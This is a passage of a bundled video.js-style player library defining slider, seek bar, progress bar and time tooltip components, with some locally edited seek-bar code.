  LiveDisplay.prototype.updateShowing = function updateShowing(event) {
    if (this.player().duration() === Infinity) {
      this.show();
    } else {
      this.hide();
    }
  };

  return LiveDisplay;
}(Component);

Component.registerComponent('LiveDisplay', LiveDisplay);

/**
 * @file slider.js
 */
/**
 * The base functionality for a slider. Can be vertical or horizontal.
 * For instance the volume bar or the seek bar on a video is a slider.
 *
 * @extends Component
 */

var Slider = function (_Component) {
  inherits(Slider, _Component);

  /**
   * Create an instance of this class
   *
   * @param {Player} player
   *        The `Player` that this class should be attached to.
   *
   * @param {Object} [options]
   *        The key/value store of player options.
   */
  function Slider(player, options) {
    classCallCheck(this, Slider);

    // Set property names to bar to match with the child Slider class is looking for
    var _this = possibleConstructorReturn(this, _Component.call(this, player, options));

    _this.bar = _this.getChild(_this.options_.barName);

    // Set a horizontal or vertical class on the slider depending on the slider type
    _this.vertical(!!_this.options_.vertical);

    _this.enable();
    return _this;
  }

  /**
   * Are controls are currently enabled for this slider or not.
   *
   * @return {boolean}
   *         true if controls are enabled, false otherwise
   */


  Slider.prototype.enabled = function enabled() {
    return this.enabled_;
  };

  /**
   * Enable controls for this slider if they are disabled
   */


  Slider.prototype.enable = function enable() {
    if (this.enabled()) {
      return;
    }

    this.on('mousedown', this.handleMouseDown);
    this.on('touchstart', this.handleMouseDown);
    this.on('focus', this.handleFocus);
    this.on('blur', this.handleBlur);
    this.on('click', this.handleClick);

    this.on(this.player_, 'controlsvisible', this.update);

    if (this.playerEvent) {
      this.on(this.player_, this.playerEvent, this.update);
    }

    this.removeClass('disabled');
    this.setAttribute('tabindex', 0);

    this.enabled_ = true;
  };

  /**
   * Disable controls for this slider if they are enabled
   */


  Slider.prototype.disable = function disable() {
    if (!this.enabled()) {
      return;
    }
    var doc = this.bar.el_.ownerDocument;

    this.off('mousedown', this.handleMouseDown);
    this.off('touchstart', this.handleMouseDown);
    this.off('focus', this.handleFocus);
    this.off('blur', this.handleBlur);
    this.off('click', this.handleClick);
    this.off(this.player_, 'controlsvisible', this.update);
    this.off(doc, 'mousemove', this.handleMouseMove);
    this.off(doc, 'mouseup', this.handleMouseUp);
    this.off(doc, 'touchmove', this.handleMouseMove);
    this.off(doc, 'touchend', this.handleMouseUp);
    this.removeAttribute('tabindex');

    this.addClass('disabled');

    if (this.playerEvent) {
      this.off(this.player_, this.playerEvent, this.update);
    }
    this.enabled_ = false;
  };

  /**
   * Create the `Button`s DOM element.
   *
   * @param {string} type
   *        Type of element to create.
   *
   * @param {Object} [props={}]
   *        List of properties in Object form.
   *
   * @param {Object} [attributes={}]
   *        list of attributes in Object form.
   *
   * @return {Element}
   *         The element that gets created.
   */


  Slider.prototype.createEl = function createEl$$1(type) {
    var props = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : {};
    var attributes = arguments.length > 2 && arguments[2] !== undefined ? arguments[2] : {};

    // Add the slider element class to all sub classes
    props.className = props.className + ' vjs-slider';
    props = assign({
      tabIndex: 0
    }, props);

    attributes = assign({
      'role': 'slider',
      'aria-valuenow': 0,
      'aria-valuemin': 0,
      'aria-valuemax': 100,
      'tabIndex': 0
    }, attributes);

    return _Component.prototype.createEl.call(this, type, props, attributes);
  };

  /**
   * Handle `mousedown` or `touchstart` events on the `Slider`.
   *
   * @param {EventTarget~Event} event
   *        `mousedown` or `touchstart` event that triggered this function
   *
   * @listens mousedown
   * @listens touchstart
   * @fires Slider#slideractive
   */


  Slider.prototype.handleMouseDown = function handleMouseDown(event) {
    var doc = this.bar.el_.ownerDocument;

    if (event.type === 'mousedown') {
      event.preventDefault();
    }
    // Do not call preventDefault() on touchstart in Chrome
    // to avoid console warnings. Use a 'touch-action: none' style
    // instead to prevent unintented scrolling.
    // https://developers.google.com/web/updates/2017/01/scrolling-intervention
    if (event.type === 'touchstart' && !IS_CHROME) {
      event.preventDefault();
    }
    blockTextSelection();

    this.addClass('vjs-sliding');
    /**
     * Triggered when the slider is in an active state
     *
     * @event Slider#slideractive
     * @type {EventTarget~Event}
     */
    this.trigger('slideractive');

    this.on(doc, 'mousemove', this.handleMouseMove);
    this.on(doc, 'mouseup', this.handleMouseUp);
    this.on(doc, 'touchmove', this.handleMouseMove);
    this.on(doc, 'touchend', this.handleMouseUp);

    this.handleMouseMove(event, true);
  };

  /**
   * Handle the `mousemove`, `touchmove`, and `mousedown` events on this `Slider`.
   * The `mousemove` and `touchmove` events will only only trigger this function during
   * `mousedown` and `touchstart`. This is due to {@link Slider#handleMouseDown} and
   * {@link Slider#handleMouseUp}.
   *
   * @param {EventTarget~Event} event
   *        `mousedown`, `mousemove`, `touchstart`, or `touchmove` event that triggered
   *        this function
   *
   * @listens mousemove
   * @listens touchmove
   */


  Slider.prototype.handleMouseMove = function handleMouseMove(event) {};

  /**
   * Handle `mouseup` or `touchend` events on the `Slider`.
   *
   * @param {EventTarget~Event} event
   *        `mouseup` or `touchend` event that triggered this function.
   *
   * @listens touchend
   * @listens mouseup
   * @fires Slider#sliderinactive
   */


  Slider.prototype.handleMouseUp = function handleMouseUp() {
    var doc = this.bar.el_.ownerDocument;

    unblockTextSelection();

    this.removeClass('vjs-sliding');
    /**
     * Triggered when the slider is no longer in an active state.
     *
     * @event Slider#sliderinactive
     * @type {EventTarget~Event}
     */
    this.trigger('sliderinactive');

    this.off(doc, 'mousemove', this.handleMouseMove);
    this.off(doc, 'mouseup', this.handleMouseUp);
    this.off(doc, 'touchmove', this.handleMouseMove);
    this.off(doc, 'touchend', this.handleMouseUp);

    this.update();
  };

  /**
   * Update the progress bar of the `Slider`.
   *
   * @returns {number}
   *          The percentage of progress the progress bar represents as a
   *          number from 0 to 1.
   */


  Slider.prototype.update = function update() {

    // In VolumeBar init we have a setTimeout for update that pops and update
    // to the end of the execution stack. The player is destroyed before then
    // update will cause an error
    if (!this.el_) {
      return;
    }

    // If scrubbing, we could use a cached value to make the handle keep up
    // with the user's mouse. On HTML5 browsers scrubbing is really smooth, but
    // some flash players are slow, so we might want to utilize this later.
    // var progress =  (this.player_.scrubbing()) ? this.player_.getCache().currentTime / this.player_.duration() : this.player_.currentTime() / this.player_.duration();
    var progress = this.getPercent();
    var bar = this.bar;

    // If there's no bar...
    if (!bar) {
      return;
    }

    // Protect against no duration and other division issues
    if (typeof progress !== 'number' || progress !== progress || progress < 0 || progress === Infinity) {
      progress = 0;
    }

    // Convert to a percentage for setting
    var percentage = (progress * 100).toFixed(2) + '%';
    var style = bar.el().style;

    // Set the new bar width or height
    if (this.vertical()) {
      style.height = percentage;
    } else {
      style.width = percentage;
    }

    return progress;
  };

  /**
   * Calculate distance for slider
   *
   * @param {EventTarget~Event} event
   *        The event that caused this function to run.
   *
   * @return {number}
   *         The current position of the Slider.
   *         - postition.x for vertical `Slider`s
   *         - postition.y for horizontal `Slider`s
   */


  Slider.prototype.calculateDistance = function calculateDistance(event) {
    var position = getPointerPosition(this.el_, event);

    if (this.vertical()) {
      return position.y;
    }
    return position.x;
  };

  /**
   * Handle a `focus` event on this `Slider`.
   *
   * @param {EventTarget~Event} event
   *        The `focus` event that caused this function to run.
   *
   * @listens focus
   */


  Slider.prototype.handleFocus = function handleFocus() {
    this.on(this.bar.el_.ownerDocument, 'keydown', this.handleKeyPress);
  };

  /**
   * Handle a `keydown` event on the `Slider`. Watches for left, rigth, up, and down
   * arrow keys. This function will only be called when the slider has focus. See
   * {@link Slider#handleFocus} and {@link Slider#handleBlur}.
   *
   * @param {EventTarget~Event} event
   *        the `keydown` event that caused this function to run.
   *
   * @listens keydown
   */


  Slider.prototype.handleKeyPress = function handleKeyPress(event) {
    // Left and Down Arrows
    if (event.which === 37 || event.which === 40) {
      event.preventDefault();
      this.stepBack();

      // Up and Right Arrows
    } else if (event.which === 38 || event.which === 39) {
      event.preventDefault();
      this.stepForward();
    }
  };

  /**
   * Handle a `blur` event on this `Slider`.
   *
   * @param {EventTarget~Event} event
   *        The `blur` event that caused this function to run.
   *
   * @listens blur
   */

  Slider.prototype.handleBlur = function handleBlur() {
    this.off(this.bar.el_.ownerDocument, 'keydown', this.handleKeyPress);
  };

  /**
   * Listener for click events on slider, used to prevent clicks
   *   from bubbling up to parent elements like button menus.
   *
   * @param {Object} event
   *        Event that caused this object to run
   */


  Slider.prototype.handleClick = function handleClick(event) {
    event.stopImmediatePropagation();
    event.preventDefault();
  };

  /**
   * Get/set if slider is horizontal for vertical
   *
   * @param {boolean} [bool]
   *        - true if slider is vertical,
   *        - false is horizontal
   *
   * @return {boolean}
   *         - true if slider is vertical, and getting
   *         - false if the slider is horizontal, and getting
   */


  Slider.prototype.vertical = function vertical(bool) {
    if (bool === undefined) {
      return this.vertical_ || false;
    }

    this.vertical_ = !!bool;

    if (this.vertical_) {
      this.addClass('vjs-slider-vertical');
    } else {
      this.addClass('vjs-slider-horizontal');
    }
  };

  return Slider;
}(Component);

Component.registerComponent('Slider', Slider);

/**
 * @file load-progress-bar.js
 */
/**
 * Shows loading progress
 *
 * @extends Component
 */

var LoadProgressBar = function (_Component) {
  inherits(LoadProgressBar, _Component);

  /**
   * Creates an instance of this class.
   *
   * @param {Player} player
   *        The `Player` that this class should be attached to.
   *
   * @param {Object} [options]
   *        The key/value store of player options.
   */
  function LoadProgressBar(player, options) {
    classCallCheck(this, LoadProgressBar);

    var _this = possibleConstructorReturn(this, _Component.call(this, player, options));

    _this.partEls_ = [];
    _this.on(player, 'progress', _this.update);
    return _this;
  }

  /**
   * Create the `Component`'s DOM element
   *
   * @return {Element}
   *         The element that was created.
   */


  LoadProgressBar.prototype.createEl = function createEl$$1() {
    return _Component.prototype.createEl.call(this, 'div', {
      className: 'vjs-load-progress',
      innerHTML: '<span class="vjs-control-text"><span>' + this.localize('Loaded') + '</span>: 0%</span>'
    });
  };

  LoadProgressBar.prototype.dispose = function dispose() {
    this.partEls_ = null;

    _Component.prototype.dispose.call(this);
  };

  /**
   * Update progress bar
   *
   * @param {EventTarget~Event} [event]
   *        The `progress` event that caused this function to run.
   *
   * @listens Player#progress
   */


  LoadProgressBar.prototype.update = function update(event) {
    var buffered = this.player_.buffered();
    var duration = this.player_.duration();
    var bufferedEnd = this.player_.bufferedEnd();
    var children = this.partEls_;

    // get the percent width of a time compared to the total end
    var percentify = function percentify(time, end) {
      // no NaN
      var percent = time / end || 0;

      return (percent >= 1 ? 1 : percent) * 100 + '%';
    };

    // update the width of the progress bar
    this.el_.style.width = percentify(bufferedEnd, duration);

    // add child elements to represent the individual buffered time ranges
    for (var i = 0; i < buffered.length; i++) {
      var start = buffered.start(i);
      var end = buffered.end(i);
      var part = children[i];

      if (!part) {
        part = this.el_.appendChild(createEl());
        children[i] = part;
      }

      // set the percent based on the width of the progress bar (bufferedEnd)
      part.style.left = percentify(start, bufferedEnd);
      part.style.width = percentify(end - start, bufferedEnd);
    }

    // remove unused buffered range elements
    for (var _i = children.length; _i > buffered.length; _i--) {
      this.el_.removeChild(children[_i - 1]);
    }
    children.length = buffered.length;
  };

  return LoadProgressBar;
}(Component);

Component.registerComponent('LoadProgressBar', LoadProgressBar);

/**
 * @file time-tooltip.js
 */
/**
 * Time tooltips display a time above the progress bar.
 *
 * @extends Component
 */

var TimeTooltip = function (_Component) {
  inherits(TimeTooltip, _Component);

  function TimeTooltip() {
    classCallCheck(this, TimeTooltip);
    return possibleConstructorReturn(this, _Component.apply(this, arguments));
  }

  /**
   * Create the time tooltip DOM element
   *
   * @return {Element}
   *         The element that was created.
   */
  TimeTooltip.prototype.createEl = function createEl$$1() {
    return _Component.prototype.createEl.call(this, 'div', {
      className: 'vjs-time-tooltip'
    });
  };

  /**
   * Updates the position of the time tooltip relative to the `SeekBar`.
   *
   * @param {Object} seekBarRect
   *        The `ClientRect` for the {@link SeekBar} element.
   *
   * @param {number} seekBarPoint
   *        A number from 0 to 1, representing a horizontal reference point
   *        from the left edge of the {@link SeekBar}
   */


  TimeTooltip.prototype.update = function update(seekBarRect, seekBarPoint, content) {
    var tooltipRect = getBoundingClientRect(this.el_);
    var playerRect = getBoundingClientRect(this.player_.el());
    var seekBarPointPx = seekBarRect.width * seekBarPoint;

    // do nothing if either rect isn't available
    // for example, if the player isn't in the DOM for testing
    if (!playerRect || !tooltipRect) {
      return;
    }

    // This is the space left of the `seekBarPoint` available within the bounds
    // of the player. We calculate any gap between the left edge of the player
    // and the left edge of the `SeekBar` and add the number of pixels in the
    // `SeekBar` before hitting the `seekBarPoint`
    var spaceLeftOfPoint = seekBarRect.left - playerRect.left + seekBarPointPx;

    // This is the space right of the `seekBarPoint` available within the bounds
    // of the player. We calculate the number of pixels from the `seekBarPoint`
    // to the right edge of the `SeekBar` and add to that any gap between the
    // right edge of the `SeekBar` and the player.
    var spaceRightOfPoint = seekBarRect.width - seekBarPointPx + (playerRect.right - seekBarRect.right);

    // This is the number of pixels by which the tooltip will need to be pulled
    // further to the right to center it over the `seekBarPoint`.
    var pullTooltipBy = tooltipRect.width / 2;

    // Adjust the `pullTooltipBy` distance to the left or right depending on
    // the results of the space calculations above.
    if (spaceLeftOfPoint < pullTooltipBy) {
      pullTooltipBy += pullTooltipBy - spaceLeftOfPoint;
    } else if (spaceRightOfPoint < pullTooltipBy) {
      pullTooltipBy = spaceRightOfPoint;
    }

    // Due to the imprecision of decimal/ratio based calculations and varying
    // rounding behaviors, there are cases where the spacing adjustment is off
    // by a pixel or two. This adds insurance to these calculations.
    if (pullTooltipBy < 0) {
      pullTooltipBy = 0;
    } else if (pullTooltipBy > tooltipRect.width) {
      pullTooltipBy = tooltipRect.width;
    }

    this.el_.style.right = '-' + pullTooltipBy + 'px';
    textContent(this.el_, content);
  };

  return TimeTooltip;
}(Component);

Component.registerComponent('TimeTooltip', TimeTooltip);

/**
 * @file play-progress-bar.js
 */
/**
 * Used by {@link SeekBar} to display media playback progress as part of the
 * {@link ProgressControl}.
 *
 * @extends Component
 */

var PlayProgressBar = function (_Component) {
  inherits(PlayProgressBar, _Component);

  function PlayProgressBar() {
    classCallCheck(this, PlayProgressBar);
    return possibleConstructorReturn(this, _Component.apply(this, arguments));
  }

  /**
   * Create the the DOM element for this class.
   *
   * @return {Element}
   *         The element that was created.
   */
  PlayProgressBar.prototype.createEl = function createEl() {
    return _Component.prototype.createEl.call(this, 'div', {
      className: 'vjs-play-progress vjs-slider-bar',
      innerHTML: '<span class="vjs-control-text"><span>' + this.localize('Progress') + '</span>: 0%</span>'
    });
  };

  /**
   * Enqueues updates to its own DOM as well as the DOM of its
   * {@link TimeTooltip} child.
   *
   * @param {Object} seekBarRect
   *        The `ClientRect` for the {@link SeekBar} element.
   *
   * @param {number} seekBarPoint
   *        A number from 0 to 1, representing a horizontal reference point
   *        from the left edge of the {@link SeekBar}
   */


  PlayProgressBar.prototype.update = function update(seekBarRect, seekBarPoint) {
    var _this2 = this;

    // If there is an existing rAF ID, cancel it so we don't over-queue.
    if (this.rafId_) {
      this.cancelAnimationFrame(this.rafId_);
    }

    this.rafId_ = this.requestAnimationFrame(function () {
      var time = _this2.player_.scrubbing() ? _this2.player_.getCache().currentTime : _this2.player_.currentTime();

      var content = formatTime(time, _this2.player_.duration());
      var timeTooltip = _this2.getChild('timeTooltip');

      if (timeTooltip) {
        timeTooltip.update(seekBarRect, seekBarPoint, content);
      }
    });
  };

  return PlayProgressBar;
}(Component);

/**
 * Default options for {@link PlayProgressBar}.
 *
 * @type {Object}
 * @private
 */


PlayProgressBar.prototype.options_ = {
  children: []
};

// Time tooltips should not be added to a player on mobile devices or IE8
if ((!IE_VERSION || IE_VERSION > 8) && !IS_IOS && !IS_ANDROID) {
  PlayProgressBar.prototype.options_.children.push('timeTooltip');
}

Component.registerComponent('PlayProgressBar', PlayProgressBar);

/**
 * @file mouse-time-display.js
 */
/**
 * The {@link MouseTimeDisplay} component tracks mouse movement over the
 * {@link ProgressControl}. It displays an indicator and a {@link TimeTooltip}
 * indicating the time which is represented by a given point in the
 * {@link ProgressControl}.
 *
 * @extends Component
 */

var MouseTimeDisplay = function (_Component) {
  inherits(MouseTimeDisplay, _Component);

  /**
   * Creates an instance of this class.
   *
   * @param {Player} player
   *        The {@link Player} that this class should be attached to.
   *
   * @param {Object} [options]
   *        The key/value store of player options.
   */
  function MouseTimeDisplay(player, options) {
    classCallCheck(this, MouseTimeDisplay);

    var _this = possibleConstructorReturn(this, _Component.call(this, player, options));

    _this.update = throttle(bind(_this, _this.update), 25);
    return _this;
  }

  /**
   * Create the DOM element for this class.
   *
   * @return {Element}
   *         The element that was created.
   */


  MouseTimeDisplay.prototype.createEl = function createEl() {
    return _Component.prototype.createEl.call(this, 'div', {
      className: 'vjs-mouse-display'
    });
  };

  /**
   * Enqueues updates to its own DOM as well as the DOM of its
   * {@link TimeTooltip} child.
   *
   * @param {Object} seekBarRect
   *        The `ClientRect` for the {@link SeekBar} element.
   *
   * @param {number} seekBarPoint
   *        A number from 0 to 1, representing a horizontal reference point
   *        from the left edge of the {@link SeekBar}
   */


  MouseTimeDisplay.prototype.update = function update(seekBarRect, seekBarPoint) {
    var _this2 = this;

    // If there is an existing rAF ID, cancel it so we don't over-queue.
    if (this.rafId_) {
      this.cancelAnimationFrame(this.rafId_);
    }

    this.rafId_ = this.requestAnimationFrame(function () {
      var duration = _this2.player_.duration();
      var content = formatTime(seekBarPoint * duration, duration);

      _this2.el_.style.left = seekBarRect.width * seekBarPoint + 'px';
      _this2.getChild('timeTooltip').update(seekBarRect, seekBarPoint, content);
    });
  };

  return MouseTimeDisplay;
}(Component);

/**
 * Default options for `MouseTimeDisplay`
 *
 * @type {Object}
 * @private
 */


MouseTimeDisplay.prototype.options_ = {
  children: ['timeTooltip']
};

Component.registerComponent('MouseTimeDisplay', MouseTimeDisplay);

/**
 * @file seek-bar.js
 */
// The number of seconds the `step*` functions move the timeline.
var STEP_SECONDS = 5;

// The interval at which the bar should update as it progresses.
var UPDATE_REFRESH_INTERVAL = 30;

/**
 * Seek bar and container for the progress bars. Uses {@link PlayProgressBar}
 * as its `bar`.
 *
 * @extends Slider
 */

var SeekBar = function (_Slider) {
  inherits(SeekBar, _Slider);

  /**
   * Creates an instance of this class.
   *
   * @param {Player} player
   *        The `Player` that this class should be attached to.
   *
   * @param {Object} [options]
   *        The key/value store of player options.
   */
  function SeekBar(player, options) {
    classCallCheck(this, SeekBar);

    var _this = possibleConstructorReturn(this, _Slider.call(this, player, options));

    _this.setEventHandlers_();
    return _this;
  }

  /**
   * Sets the event handlers
   *
   * @private
   */


  SeekBar.prototype.setEventHandlers_ = function setEventHandlers_() {
    var _this2 = this;

    this.update = throttle(bind(this, this.update), UPDATE_REFRESH_INTERVAL);

    this.on(this.player_, 'timeupdate', this.update);
    this.on(this.player_, 'ended', this.handleEnded);

    // when playing, let's ensure we smoothly update the play progress bar
    // via an interval
    this.updateInterval = null;

    this.on(this.player_, ['playing'], function () {
      _this2.clearInterval(_this2.updateInterval);

      _this2.updateInterval = _this2.setInterval(function () {
        _this2.requestAnimationFrame(function () {
          _this2.update();
        });
      }, UPDATE_REFRESH_INTERVAL);
    });

    this.on(this.player_, ['ended', 'pause', 'waiting'], function () {
      _this2.clearInterval(_this2.updateInterval);
    });

    this.on(this.player_, ['timeupdate', 'ended'], this.update);
  };

  /**
   * Create the `Component`'s DOM element
   *
   * @return {Element}
   *         The element that was created.
   */


  SeekBar.prototype.createEl = function createEl$$1() {
    return _Slider.prototype.createEl.call(this, 'div', {
      className: 'vjs-progress-holder'
    }, {
      'aria-label': this.localize('Progress Bar')
    });
  };

  /**
   * This function updates the play progress bar and accessiblity
   * attributes to whatever is passed in.
   *
   * @param {number} currentTime
   *        The currentTime value that should be used for accessiblity
   *
   * @param {number} percent
   *        The percentage as a decimal that the bar should be filled from 0-1.
   *
   * @private
   */


  SeekBar.prototype.update_ = function update_(currentTime, percent) {
    var duration = this.player_.duration();

    // machine readable value of progress bar (percentage complete)
    this.el_.setAttribute('aria-valuenow', (percent * 100).toFixed(2));

    // human readable value of progress bar (time complete)
    this.el_.setAttribute('aria-valuetext', this.localize('progress bar timing: currentTime={1} duration={2}', [formatTime(currentTime, duration), formatTime(duration, duration)], '{1} of {2}'));

    // Update the `PlayProgressBar`.
    this.bar.update(getBoundingClientRect(this.el_), percent);
  };

  /**
   * Update the seek bar's UI.
   *
   * @param {EventTarget~Event} [event]
   *        The `timeupdate` or `ended` event that caused this to run.
   *
   * @listens Player#timeupdate
   *
   * @returns {number}
   *          The current percent at a number from 0-1
   */


  SeekBar.prototype.update = function update(event) {
    var percent = _Slider.prototype.update.call(this);

    this.update_(this.getCurrentTime_(), percent);
    return percent;
  };

  /**
   * Get the value of current time but allows for smooth scrubbing,
   * when player can't keep up.
   *
   * @return {number}
   *         The current time value to display
   *
   * @private
   */


  SeekBar.prototype.getCurrentTime_ = function getCurrentTime_() {
    return this.player_.scrubbing() ? this.player_.getCache().currentTime : this.player_.currentTime();
  };

  /**
   * We want the seek bar to be full on ended
   * no matter what the actual internal values are. so we force it.
   *
   * @param {EventTarget~Event} [event]
   *        The `timeupdate` or `ended` event that caused this to run.
   *
   * @listens Player#ended
   */


  SeekBar.prototype.handleEnded = function handleEnded(event) {
    this.update_(this.player_.duration(), 1);
  };

  /**
   * Get the percentage of media played so far.
   *
   * @return {number}
   *         The percentage of media played so far (0 to 1).
   */


  SeekBar.prototype.getPercent = function getPercent() {
    // Allows for smooth scrubbing, when player can't keep up.
    // const time = (this.player_.scrubbing()) ?
    //   this.player_.getCache().currentTime :
    //   this.player_.currentTime()
    const time = this.player_.currentTime()
    const percent = time / this.player_.duration()
    return percent >= 1 ? 1 : percent
  }

  /**
   * Handle mouse down on seek bar
   *
   * @param {EventTarget~Event} event
   *        The `mousedown` event that caused this to run.
   *
   * @listens mousedown
   */


  SeekBar.prototype.handleMouseDown = function handleMouseDown(event) {
    if (!isSingleLeftClick(event)) {
      return;
    }

    // Stop event propagation to prevent double fire in progress-control.js
    event.stopPropagation();
    this.player_.scrubbing(true);

    this.videoWasPlaying = !this.player_.paused();
    this.player_.pause();

    _Slider.prototype.handleMouseDown.call(this, event);
  };

  /**
   * Handle mouse move on seek bar
   *
   * @param {EventTarget~Event} event
   *        The `mousemove` event that caused this to run.
   *
   * @listens mousemove
   */


  SeekBar.prototype.handleMouseMove = function handleMouseMove(event, force) {
    if (force || !this?.player_?.options_?.disableSeekBar) {
      let newTime = this.calculateDistance(event) * this.player_.duration()
      if (newTime === this.player_.duration()) {
        newTime = newTime - 0.1
      }
      // this.player_.currentTime(newTime)
      videoHelper.setCurrentTime(this.player_.el_.querySelector("video"), newTime);
      this.update()
    }
  }

  SeekBar.prototype.enable = function enable() {
    _Slider.prototype.enable.call(this);
    var mouseTimeDisplay = this.getChild('mouseTimeDisplay');

    if (!mouseTimeDisplay) {
      return;
    }

    mouseTimeDisplay.show();
  };

  SeekBar.prototype.disable = function disable() {
    _Slider.prototype.disable.call(this);
    var mouseTimeDisplay = this.getChild('mouseTimeDisplay');

    if (!mouseTimeDisplay) {
      return;
    }

    mouseTimeDisplay.hide();
  };

  /**
   * Handle mouse up on seek bar
   *
   * @param {EventTarget~Event} event
   *        The `mouseup` event that caused this to run.
   *
   * @listens mouseup
   */


  SeekBar.prototype.handleMouseUp = function handleMouseUp(event) {
    _Slider.prototype.handleMouseUp.call(this, event);

    // Stop event propagation to prevent double fire in progress-control.js
    if (event) {
      event.stopPropagation();
    }
    this.player_.scrubbing(false);

    /**
     * Trigger timeupdate because we're done seeking and the time has changed.
     * This is particularly useful for if the player is paused to time the time displays.
     *
     * @event Tech#timeupdate
     * @type {EventTarget~Event}
     */
    this.player_.trigger({ type: 'timeupdate', target: this, manuallyTriggered: true });
    if (this.videoWasPlaying) {
      silencePromise(this.player_.play());
    }
  };

  /**
   * Move more quickly fast forward for keyboard-only users
   */


  SeekBar.prototype.stepForward = function stepForward() {
    this.player_.currentTime(this.player_.currentTime() + STEP_SECONDS);
  };

  /**
   * Move more quickly rewind for keyboard-only users
   */


  SeekBar.prototype.stepBack = function stepBack() {
    this.player_.currentTime(this.player_.currentTime() - STEP_SECONDS);
  };

  /**
   * Toggles the playback state of the player
   * This gets called when enter or space is used on the seekbar
   *
   * @param {EventTarget~Event} event
   *        The `keydown` event that caused this function to be called
   *
   */


  SeekBar.prototype.handleAction = function handleAction(event) {
    if (this.player_.paused()) {
      this.player_.play();
    } else {
      this.player_.pause();
    }
  };

  /**
   * Called when this SeekBar has focus and a key gets pressed down. By
   * default it will call `this.handleAction` when the key is space or enter.
   *
   * @param {EventTarget~Event} event
   *        The `keydown` event that caused this function to be called.
   *
   * @listens keydown
   */


  SeekBar.prototype.handleKeyPress = function handleKeyPress(event) {

    // Support Space (32) or Enter (13) key operation to fire a click event
    if (event.which === 32 || event.which === 13) {
      event.preventDefault();
      this.handleAction(event);
    } else if (_Slider.prototype.handleKeyPress) {

      // Pass keypress handling up for unsupported keys
      _Slider.prototype.handleKeyPress.call(this, event);
    }
  };

  return SeekBar;
}(Slider);

/**
 * Default options for the `SeekBar`
 *
 * @type {Object}
 * @private
 */


SeekBar.prototype.options_ = {
  children: ['loadProgressBar', 'playProgressBar'],
  barName: 'playProgressBar'
};

// MouseTimeDisplay tooltips should not be added to a player on mobile devices or IE8
if ((!IE_VERSION || IE_VERSION > 8) && !IS_IOS && !IS_ANDROID) {
  SeekBar.prototype.options_.children.splice(1, 0, 'mouseTimeDisplay');
}

/**
 * Call the update event for this Slider when this event happens on the player.
 *
 * @type {string}
 */
SeekBar.prototype.playerEvent = 'timeupdate';

Component.registerComponent('SeekBar', SeekBar);

/**
 * @file progress-control.js
 */
/**
 * The Progress Control component contains the seek bar, load progress,
 * and play progress.
 *
 * @extends Component
 */

var ProgressControl = function (_Component) {
  inherits(ProgressControl, _Component);

  /**
   * Creates an instance of this class.
   *
   * @param {Player} player
   *        The `Player` that this class should be attached to.
   *
   * @param {Object} [options]
   *        The key/value store of player options.
   */
  function ProgressControl(player, options) {
    classCallCheck(this, ProgressControl);

    var _this = possibleConstructorReturn(this, _Component.call(this, player, options));

    _this.handleMouseMove = throttle(bind(_this, _this.handleMouseMove), 25);
    _this.throttledHandleMouseSeek = throttle(bind(_this, _this.handleMouseSeek), 25);

    _this.enable();
    return _this;
  }

  /**
   * Create the `Component`'s DOM element
   *
   * @return {Element}
   *         The element that was created.
   */


  ProgressControl.prototype.createEl = function createEl$$1() {
    return _Component.prototype.createEl.call(this, 'div', {
      className: 'vjs-progress-control vjs-control'
    });
  };

  /**
   * When the mouse moves over the `ProgressControl`, the pointer position
   * gets passed down to the `MouseTimeDisplay` component.
   *
   * @param {EventTarget~Event} event
   *        The `mousemove` event that caused this function to run.
   *
   * @listen mousemove
   */


  ProgressControl.prototype.handleMouseMove = function handleMouseMove(event) {
    var seekBar = this.getChild('seekBar');

    if (seekBar) {
      var mouseTimeDisplay = seekBar.getChild('mouseTimeDisplay');
      var seekBarEl = seekBar.el();
      var seekBarRect = getBoundingClientRect(seekBarEl);
      var seekBarPoint = getPointerPosition(seekBarEl, event).x;

      // The default skin has a gap on either side of the `SeekBar`. This means
      // that it's possible to trigger this behavior outside the boundaries of
      // the `SeekBar`. This ensures we stay within it at all times.
      if (seekBarPoint > 1) {
        seekBarPoint = 1;
      } else if (seekBarPoint < 0) {
        seekBarPoint = 0;
      }

      if (mouseTimeDisplay) {
        mouseTimeDisplay.update(seekBarRect, seekBarPoint);
      }
    }
  };

  /**
   * A throttled version of the {@link ProgressControl#handleMouseSeek} listener.
   *
   * @method ProgressControl#throttledHandleMouseSeek
   * @param {EventTarget~Event} event
   *        The `mousemove` event that caused this function to run.
   *
   * @listen mousemove
   * @listen touchmove
   */

  /**
   * Handle `mousemove` or `touchmove` events on the `ProgressControl`.
   *
   * @param {EventTarget~Event} event
   *        `mousedown` or `touchstart` event that triggered this function
   *
   * @listens mousemove
   * @listens touchmove
   */


  ProgressControl.prototype.handleMouseSeek = function handleMouseSeek(event) {
    var seekBar = this.getChild('seekBar');

    if (seekBar) {
      seekBar.handleMouseMove(event);
    }
  };

  /**
   * Are controls are currently enabled for this progress control.
   *
   * @return {boolean}
   *         true if controls are enabled, false otherwise
   */


  ProgressControl.prototype.enabled = function enabled() {
    return this.enabled_;
  };

  /**
   * Disable all controls on the progress control and its children
   */


  ProgressControl.prototype.disable = function disable() {
    this.children().forEach(function (child) {
      return child.disable && child.disable();
    });

    if (!this.enabled()) {
      return;
    }

    this.off(['mousedown', 'touchstart'], this.handleMouseDown);
    this.off(this.el_, 'mousemove', this.handleMouseMove);
    this.handleMouseUp();

    this.addClass('disabled');

    this.enabled_ = false;
  };

  /**
   * Enable all controls on the progress control and its children
   */


  ProgressControl.prototype.enable = function enable() {
    this.children().forEach(function (child) {
      return child.enable && child.enable();
    });

    if (this.enabled()) {
      return;
    }

    this.on(['mousedown', 'touchstart'], this.handleMouseDown);
    this.on(this.el_, 'mousemove', this.handleMouseMove);
    this.removeClass('disabled');

    this.enabled_ = true;
  };

  /**
   * Handle `mousedown` or `touchstart` events on the `ProgressControl`.
   *
   * @param {EventTarget~Event} event
   *        `mousedown` or `touchstart` event that triggered this function
   *
   * @listens mousedown
   * @listens touchstart
   */


  ProgressControl.prototype.handleMouseDown = function handleMouseDown(event) {
    var doc = this.el_.ownerDocument;
    var seekBar = this.getChild('seekBar');

    if (seekBar) {
      seekBar.handleMouseDown(event);
    }

    this.on(doc, 'mousemove', this.throttledHandleMouseSeek);
    this.on(doc, 'touchmove', this.throttledHandleMouseSeek);
    this.on(doc, 'mouseup', this.handleMouseUp);
    this.on(doc, 'touchend', this.handleMouseUp);
  };

  /**
   * Handle `mouseup` or `touchend` events on the `ProgressControl`.
   *
   * @param {EventTarget~Event} event
   *        `mouseup` or `touchend` event that triggered this function.
   *
   * @listens touchend
   * @listens mouseup
   */

